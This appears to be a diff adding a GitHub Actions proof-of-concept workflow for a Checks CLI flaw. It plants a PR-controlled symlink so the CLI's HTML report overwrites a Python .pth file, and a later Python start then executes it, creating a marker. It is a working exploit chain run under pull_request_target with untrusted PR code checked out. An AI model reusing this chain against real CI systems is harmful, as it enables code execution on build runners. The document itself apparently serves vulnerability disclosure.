@@ -1,0 +1,79 @@
+name: T1 Python PTH Output Symlink Proof
+
+on:
+  pull_request_target:
+    types: [opened, synchronize, reopened]
+
+permissions:
+  contents: read
+  pull-requests: read
+
+jobs:
+  python-pth-output-symlink:
+    if: >-
+      github.event.pull_request.head.repo.full_name == 'cllc3993/checks-s1-ci-impact-poc' &&
+      startsWith(github.event.pull_request.head.ref, 'accountb-python-pth-')
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout PR head
+        uses: actions/checkout@v4
+        with:
+          repository: ${{ github.event.pull_request.head.repo.full_name }}
+          ref: ${{ github.event.pull_request.head.sha }}
+
+      - name: Prepare Python user-site target
+        shell: bash
+        run: |
+          set -euo pipefail
+          test -d scan-root
+          test -f scan-root/MainActivity.java
+          test -L report.html
+          actual_target="$(readlink report.html)"
+          expected_target="../../../.local/lib/python3.12/site-packages/checks_t1_ci.pth"
+          test "$actual_target" = "$expected_target"
+          python3.12 --version
+          user_site="$(python3.12 -c 'import site; print(site.getusersitepackages())')"
+          test "$user_site" = "$HOME/.local/lib/python3.12/site-packages"
+          mkdir -p "$user_site"
+          printf 'TRUSTED_PTH_ORIGINAL_20260602\n' > "$user_site/checks_t1_ci.pth"
+          printf 'attacker-output-symlink=%s -> %s\n' "report.html" "$actual_target"
+          printf 'resolved-output-target=%s\n' "$(readlink -f report.html)"
+          printf 'python-user-site=%s\n' "$user_site"
+          printf 'pth-before-first-line=%s\n' "$(sed -n '1p' "$user_site/checks_t1_ci.pth")"
+
+      - name: Install Checks CLI
+        shell: bash
+        run: |
+          set -euo pipefail
+          curl --compressed https://dl.google.com/checks/cli/latest/checks-linux -o checks
+          chmod +x ./checks
+          ./checks --version
+
+      - name: Generate HTML report to PR-controlled PTH symlink
+        shell: bash
+        run: |
+          set -euo pipefail
+          ./checks code scan scan-root \
+            --skip-upload \
+            --format=html \
+            --output report.html \
+            --account-id=1 \
+            --repo-id=1 \
+            --scm-remote-url=https://github.com/claudeloba/checks-s1-ci-impact-poc \
+            --branch-name=ci-python-pth-output-symlink \
+            --scm-revision="T1_PYTHON_PTH_${GITHUB_RUN_ID}_${GITHUB_RUN_ATTEMPT}" \
+            --disable-analytics \
+            --disable-version-check \
+            --no-input
+
+      - name: Later Python process executes clobbered PTH
+        shell: bash
+        run: |
+          set -euo pipefail
+          target="$HOME/.local/lib/python3.12/site-packages/checks_t1_ci.pth"
+          grep -q 'T1_PYTHON_PTH_CI_MARKER_20260602' "$target"
+          printf 'pth-after-first-line=%s\n' "$(sed -n '1p' "$target")"
+          rm -f "$HOME/T1_PYTHON_PTH_CI_MARKER_20260602"
+          python3.12 -c 'print("PYTHON_STARTED_AFTER_CHECKS")'
+          test -f "$HOME/T1_PYTHON_PTH_CI_MARKER_20260602"
+          printf 'python-pth-output-symlink-result=pth-import-executed\n'
